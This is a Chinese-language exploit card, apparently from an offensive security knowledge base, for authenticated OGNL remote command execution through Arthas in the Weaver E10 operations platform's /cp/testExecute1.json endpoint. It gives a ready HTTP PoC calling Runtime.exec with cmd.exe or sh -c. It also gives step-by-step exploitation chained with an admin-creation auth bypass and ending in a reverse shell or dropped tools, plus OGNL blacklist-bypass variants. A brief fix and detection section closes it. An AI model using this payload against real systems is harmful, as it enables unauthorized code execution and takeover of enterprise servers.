---
id: web-java-expression-ognl-weaver-e10-testexecute1-arthas-rce
title: 泛微 E10 testExecute1 的 Arthas OGNL 执行：serverId+input 调 Runtime.exec（依赖 JDK 环境）
type: scenario
domain: web
path: web/java/expression/ognl
technique: weaver-e10-testexecute1-arthas-ognl-rce
tags:
- java
- ognl
- arthas
- rce
- weaver
- ecology
- e10
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T06:44:41+08:00'
  notes: 已对照原文 testExecute1 请求、ArthasTools 反编译与 JDK 报错/换高版本截图核对；文章明确自带 JDK 失败、高版本 JDK 成功，属环境相关 RCE，confidence medium 合理。
url: /docs/web/java/expression/ognl/web-java-expression-ognl-weaver-e10-testexecute1-arthas-rce/
draft: false
kb_aliases:
- 泛微 E10 Arthas RCE
- testExecute1.json OGNL
- e-monitor Arthas 命令执行
- serverId input ognl Runtime.exec
---

## 一句话结论

泛微 E10 运维平台的 `/cp/testExecute1.json` 把用户提交的 `serverId` 与 `input` 交给 Arthas 执行，`input` 可为 `ognl '@java.lang.Runtime@getRuntime().exec(...)'`；文章在自带 JDK 下执行失败（不是有效 Win32 程序），改用高版本 JDK 后成功写入文件，说明这是依赖运行环境的认证后 OGNL 命令执行。

## 原理

- `/cp/testExecute1.json` 属于运维平台的服务管理/Arthas 控制功能，请求体包含 `serverId`（目标服务 ID）与 `input`（Arthas 命令）。
- 后端将 `input` 传给 Arthas 的 `ognl` 命令执行；OGNL 表达式可访问 `java.lang.Runtime`，从而调用 `Runtime.getRuntime().exec()` 启动系统进程。
- 文章 payload：
  ```json
  {"serverId":"51cda82708204725beb2d9ba715a53fd",
   "input":"ognl '@java.lang.Runtime@getRuntime().exec(new String[]{\"cmd.exe\", \"/c\", \"echo '111' > D:/1.txt\"})'"}
  ```
- 执行依赖运维平台自带 JDK/Arthas 能否正常启动：文章在默认自带 JDK 下报“不是有效的 Win32 应用程序”，换成高版本 JDK 后复现成功；因此利用是否成功取决于目标 JDK 版本与 Arthas 启动方式，属于环境相关 RCE。
- `serverId` 可从运维平台配置或接口获取（文章提到“可以直接查看配置得到”）。

## 触发条件

- 目标为泛微 E10 运维管理平台（文章测试 Ecology10.0.2403.01）。
- 已获得有效 `token`/`JSESSIONID` 或管理员会话；该接口位于 `/cp/`，不在 `/sapi/bs/**` 白名单中，但可配合 `/sapi/bs/**` 鉴权绕过创建管理员后登录。
- 目标服务（serverId 对应）在线，Arthas 能在该服务 JVM 上启动；目标 JDK/Arthas 版本兼容。
- 需要知道 serverId 与目标操作系统（Windows 用 `cmd.exe /c`，Linux 用 `sh -c`）。

## 利用步骤

1. 通过 `/sapi/bs/**` 鉴权绕过创建管理员并登录，拿到 token/JSESSIONID。
2. 从配置或接口获取目标 `serverId`（文章示例 `51cda82708204725beb2d9ba715a53fd`）。
3. 向 `/cp/testExecute1.json` 提交带 `ognl` 表达式的 `input`，先执行无害命令（写文件/`whoami`）验证。
4. 若返回失败且提示 Arthas/JDK 错误，尝试更换目标服务或利用其它 JDK 兼容的服务；成功后执行反向 shell 或落地工具。

## PoC

```http
POST /cp/testExecute1.json HTTP/1.1
Host: target:9081
token: <token>
Cookie: JSESSIONID=<session>; userToken=<token>
Content-Type: application/json;charset=utf-8

{"serverId":"51cda82708204725beb2d9ba715a53fd",
"input":"ognl '@java.lang.Runtime@getRuntime().exec(new String[]{\"cmd.exe\", \"/c\", \"echo '111' > D:/1.txt\"})'"}
```

Linux 目标将 `cmd.exe /c` 换为 `sh -c`，命令改为 `id > /tmp/1.txt`。

## 变体与关联

- **OGNL 黑名单绕过**：Arthas 版本若对 `Runtime` 做黑名单，可尝试反射调用、`ProcessBuilder`、`Class.forName` 等（参考 OGNL 高版本绕过卡）。
- **其他 Arthas 入口**：文章提到 `getAllArthasPort.json` 可枚举 Arthas 端口/服务，配合 serverId 选择目标。
- **关联**：[[web-java-expression-ognl-high-version-reflection-invoke-bypass]]（OGNL 黑名单反射绕过）、[[web-java-expression-ognl-jshell-eval-bypass]]（JShell 绕过）、[[web-java-framework-spring-weaver-e10-sapi-bs-wildcard-auth-bypass-admin]]（前置未授权管理员创建）。

## 检测与防御

- **修复**：`testExecute1.json` 等 Arthas 执行接口仅允许管理员且做操作白名单；禁止把用户输入直接拼进 Arthas `ognl` 命令；对 `input` 做严格的表达式白名单或改用预定义诊断命令。
- **加固**：Arthas 端口仅监听本地/内网并鉴权；运维平台限制来源 IP；升级 JDK/Arthas 并移除不必要的动态执行能力。
- **检测**：监控 `/cp/testExecute1.json` 的 `input` 中出现 `ognl`、`Runtime`、`ProcessBuilder`、`exec`、`cmd.exe`、`sh -c` 等特征；审计 Arthas 启动与异常子进程。
